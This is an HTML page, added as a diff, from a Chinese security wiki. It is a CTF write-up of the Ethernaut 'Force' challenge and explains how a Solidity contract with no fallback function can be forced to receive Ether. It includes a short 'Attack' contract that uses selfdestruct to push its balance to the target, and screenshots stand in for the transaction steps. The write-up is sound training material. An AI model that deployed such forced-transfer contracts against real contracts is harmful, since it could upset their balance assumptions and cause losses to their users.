@@ -1,0 +1,188 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+  
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <meta name="author" content="内部使用">
+    <link rel="canonical" href="https://secnn.com/CTF/blockchain/Ethernaut/Force/">
+    <link rel="shortcut icon" href="../../../../favicon.ico">
+    
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+    <title>7.Force - SecNN-Wiki漏洞库管理系统&网络安全知识库-本Wiki所有信息来源于公开漏洞数据库</title>
+    <link href="../../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
+    <link href="../../../../css/font-awesome-4.7.0.css" rel="stylesheet">
+    <link href="../../../../css/base.css" rel="stylesheet">
+    <link rel="stylesheet" href="../../../../css/highlight.css">
+    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
+    <![endif]-->
+
+    <script src="../../../../js/jquery-3.2.1.min.js"></script>
+    <script src="../../../../js/bootstrap-3.3.7.min.js"></script>
+    <script src="../../../../js/highlight.pack.js"></script>
+    
+    <base target="_top">
+    <script>
+      var base_url = '../../../..';
+      var is_top_frame = false;
+        
+        var pageToc = [
+          {title: "7.Force", url: "#_top", children: [
+              {title: "\u9898\u76ee\u63cf\u8ff0", url: "#_1" },
+              {title: "\u89e3\u9898\u8fc7\u7a0b", url: "#_2" },
+          ]},
+        ];
+
+    </script>
+    <script src="../../../../js/base.js"></script>
+      <script src="../../../../search/main.js"></script> 
+</head>
+
+<body>
+<script>
+if (is_top_frame) { $('body').addClass('wm-top-page'); }
+</script>
+
+
+
+<div class="container-fluid wm-page-content">
+  <a name="_top"></a>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../Hello%20Ethernaut/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../Hello%20Ethernaut/" class="btn btn-xs btn-link">
+        0.Hello Ethernaut
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../Fallout/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../Fallout/" class="btn btn-xs btn-link">
+        2.Fallout
+      </a>
+    </div>
+    
+  </div>
+
+    
+
+    <h1 id="7force">7.Force<a class="headerlink" href="#7force" title="Permanent link">&para;</a></h1>
+<h2 id="_1">题目描述<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h2>
+<p><img alt="img" src="../../../.vuepress/public/img/1645310166968-61bf7c00-6a02-4a84-b26a-f895aa72be1e.png" /></p>
+<h2 id="_2">解题过程<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h2>
+<p>题目源码</p>
+<div class="highlight"><pre><span></span><code><span class="c1">// SPDX-License-Identifier: MIT</span>
+<span class="nx">pragma</span><span class="w"> </span><span class="nx">solidity</span><span class="w"> </span><span class="o">^</span><span class="mf">0.6.0</span><span class="p">;</span>
+
+<span class="nx">contract</span><span class="w"> </span><span class="nx">Force</span><span class="w"> </span><span class="p">{</span><span class="cm">/*</span>
+
+<span class="cm">                   MEOW ?</span>
+<span class="cm">         /\_/\   /</span>
+<span class="cm">    ____/ o o \</span>
+<span class="cm">  /~____  =ø= /</span>
+<span class="cm"> (______)__m_m)</span>
+
+<span class="cm">*/</span><span class="p">}</span>
+</code></pre></div>
+<p>题目要求为该合约余额大于0，而源码中不存在 fallback函数，导致合约不能通过常规交易接收以太币。</p>
+<p><img alt="img" src="../../../.vuepress/public/img/1645310742977-9e519e94-8580-4bce-b8fd-f08ab9203723.png" /></p>
+<p>我们在官方文档中可以看到一个函数介绍，可以在没有 fallback的情况下强制对合约进行转账</p>
+<p><img alt="img" src="../../../.vuepress/public/img/1645310796703-eff3f936-8b01-4abc-bac0-d636118592aa.png" /></p>
+<p>那我们的思路就是部署一个自毁合约，对这个合约转账后进行自毁对目标合约强制转入以太币</p>
+<p><img alt="img" src="../../../.vuepress/public/img/1645311086893-c7687fa0-ea7f-428e-98b2-f3fc236265fd.png" /></p>
+<p>部署攻击合约</p>
+<div class="highlight"><pre><span></span><code><span class="c1">// SPDX-License-Identifier: MIT</span>
+<span class="nx">pragma</span><span class="w"> </span><span class="nx">solidity</span><span class="w"> </span><span class="o">^</span><span class="mf">0.6.0</span><span class="p">;</span>
+
+<span class="nx">contract</span><span class="w"> </span><span class="nx">Force</span><span class="w"> </span><span class="p">{</span><span class="cm">/*</span>
+
+<span class="cm">                   MEOW ?</span>
+<span class="cm">         /\_/\   /</span>
+<span class="cm">    ____/ o o \</span>
+<span class="cm">  /~____  =ø= /</span>
+<span class="cm"> (______)__m_m)</span>
+
+<span class="cm">*/</span><span class="p">}</span>
+
+<span class="nx">contract</span><span class="w"> </span><span class="nx">Attack</span><span class="p">{</span>
+
+<span class="w">    </span><span class="nx">address</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="nx">addr</span><span class="p">;</span>
+
+<span class="w">    </span><span class="kd">function</span><span class="w"> </span><span class="nx">setAddr</span><span class="p">(</span><span class="nx">address</span><span class="w"> </span><span class="nx">x</span><span class="p">)</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="nx">addr</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">x</span><span class="p">;</span>
+<span class="w">    </span><span class="p">}</span>
+
+<span class="w">    </span><span class="kd">function</span><span class="w"> </span><span class="nx">kill</span><span class="p">()</span><span class="w"> </span><span class="kr">public</span><span class="p">{</span>
+<span class="w">        </span><span class="nx">address</span><span class="w"> </span><span class="nx">payable</span><span class="w"> </span><span class="nx">desaddr</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">payable</span><span class="p">(</span><span class="nx">address</span><span class="p">(</span><span class="nx">addr</span><span class="p">));</span>
+<span class="w">        </span><span class="nx">selfdestruct</span><span class="p">(</span><span class="nx">desaddr</span><span class="p">);</span>
+<span class="w">    </span><span class="p">}</span>
+<span class="w">    </span><span class="nx">receive</span><span class="p">()</span><span class="w"> </span><span class="nx">external</span><span class="w"> </span><span class="nx">payable</span><span class="w"> </span><span class="p">{}</span>
+<span class="p">}</span>
+</code></pre></div>
+<p>向攻击合约地址转入 0.001 ETH</p>
+<p><img alt="img" src="../../../.vuepress/public/img/1645312161704-d95d2483-00d4-4c05-bfaf-dce922feb7a8.png" /></p>
+<p><img alt="img" src="../../../.vuepress/public/img/1645312130166-8bf4b2ae-3e55-44f4-90e1-8d7d6f152e0c.png" /></p>
+<p>向目标合约调用自毁函数</p>
+<p><img alt="img" src="../../../.vuepress/public/img/1645312357912-61ba040b-d64c-473c-85cd-7a55d0b6881e.png" /></p>
+<p>查看交易hash是否成功</p>
+<p><img alt="img" src="../../../.vuepress/public/img/1645312376428-a376d0b7-f266-4525-ad66-937df46c3b46.png" /></p>
+<p><img alt="img" src="../../../.vuepress/public/img/1645312386621-eb7a524d-962c-42bc-812f-40006baca411.png" /></p>
+<p>目标合约成功被强制转入ETH</p>
+
+  <br>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../Hello%20Ethernaut/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../Hello%20Ethernaut/" class="btn btn-xs btn-link">
+        0.Hello Ethernaut
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../Fallout/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../Fallout/" class="btn btn-xs btn-link">
+        2.Fallout
+      </a>
+    </div>
+    
+  </div>
+
+    <br>
+</div>
+
+<footer class="col-md-12 wm-page-content"><p>Copyright © 2025 SecNN-Wiki</p>
+  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="None">Windmill Dark</a> theme by 内部使用 (noraj).</p>
+</footer>
+
+</body>
+</html>
